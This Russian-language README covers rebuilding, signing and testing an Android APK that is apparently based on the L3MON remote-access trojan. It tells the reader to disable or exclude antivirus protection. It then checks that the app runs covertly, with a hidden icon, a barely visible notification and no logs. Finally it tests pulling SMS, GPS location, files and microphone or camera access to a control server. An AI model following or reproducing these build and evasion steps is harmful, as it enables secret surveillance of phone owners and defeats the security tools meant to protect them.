# Инструкция по пересборке и тестированию APK

## Проблема с антивирусом

Антивирус блокирует создание `classes.dex` файла, так как распознаёт его как потенциально опасный. Это нормально для такого типа приложений.

## Решение

### Вариант 1: Добавить исключение в антивирус

1. Откройте настройки вашего антивируса (Windows Defender / другой)
2. Добавьте исключение для папки: `D:\Projects\android-manage\app\factory`
3. Также добавьте исключение для: `D:\Projects\android-manage\assets\webpublic`
4. Повторно запустите сборку

### Вариант 2: Временно отключить защиту

1. Временно отключите защиту в реальном времени
2. Выполните сборку
3. Включите защиту обратно

### Вариант 3: Использовать виртуальную машину

Соберите APK на виртуальной машине без активной защиты.

## Пересборка APK

После добавления исключения выполните:

```bash
cd app\factory
rebuild.bat
```

Или вручную:

```bash
cd app\factory
java -jar apktool.jar b decompiled -o ..\..\assets\webpublic\build.apk
java -jar sign.jar ..\..\assets\webpublic\build.apk
```

Готовый APK будет в: `assets\webpublic\build.apk`

## Тестирование на устройстве

### Подготовка

1. **Включите отладку по USB** на Android-устройстве:
   - Настройки → О телефоне → Нажмите 7 раз на "Номер сборки"
   - Настройки → Для разработчиков → Включите "Отладка по USB"

2. **Подключите устройство** к компьютеру через USB

3. **Проверьте подключение**:
   ```bash
   adb devices
   ```
   Должно показать ваше устройство

### Установка APK

```bash
adb install -r assets\webpublic\build.apk
```

Или скопируйте APK на устройство и установите вручную.

### Проверка работы

1. **Автозапуск сервиса**: После установки сервис должен запуститься автоматически
2. **Проверка подключения**: Убедитесь, что realtime-gateway запущен и принимает подключения
3. **Проверка stealth**:
   - Нет иконки приложения в лаунчере (MainActivity скрыта)
   - Foreground notification минимально заметное
   - Нет Toast-сообщений
   - Нет логов в logcat (кроме системных)

### Проверка логов

```bash
adb logcat | grep -i "l3mon\|etechd"
```

Не должно быть видно логов приложения (только системные сообщения).

### Проверка подключения к серверу

1. Запустите realtime-gateway:
   ```bash
   cd platform\realtime-gateway
   npm run dev
   ```

2. Запустите control-api:
   ```bash
   cd platform\control-api
   npm run dev
   ```

3. Проверьте, что устройство появилось в списке устройств через API:
   ```bash
   curl http://localhost:4000/v1/devices
   ```

### Тестирование функций

- **SMS**: Отправьте тестовое SMS, проверьте получение на сервере
- **GPS**: Запросите местоположение, проверьте точность
- **Файлы**: Попробуйте получить список файлов
- **Микрофон/Камера**: На Android 12+ должны быть заблокированы (без индикаторов)

## Откат изменений

Если что-то пошло не так, восстановите из backup:

```bash
# Найдите последний backup
dir backup\factory_*

# Скопируйте обратно
xcopy /E /I backup\factory_YYYYMMDDHHMMSS app\factory\decompiled
```

## Известные проблемы

- **Антивирус блокирует сборку**: Добавьте исключения (см. выше)
- **APK не устанавливается**: Проверьте, что включена установка из неизвестных источников
- **Сервис не запускается**: Проверьте разрешения в настройках Android
- **Нет подключения**: Проверьте, что realtime-gateway запущен и порт 22222 открыт

